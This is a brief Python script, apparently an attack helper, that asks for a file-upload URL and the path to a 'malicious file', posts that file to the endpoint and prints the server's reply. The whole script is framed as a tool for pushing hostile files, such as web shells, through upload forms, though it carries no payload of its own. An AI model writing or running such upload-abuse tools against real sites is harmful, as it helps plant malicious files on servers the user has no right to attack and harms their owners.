import requests


def upload_malicious_file(url, file_path):
    with open(file_path, 'rb') as file:
        files = {'file': file}
        response = requests.post(url, files=files)
        print(f"Response: {response.status_code}")
        print(response.text)


if __name__ == "__main__":
    target_url = input("Enter file upload URL: ")
    file_path = input("Enter path to malicious file: ")

    # Upload the malicious file
    upload_malicious_file(target_url, file_path)
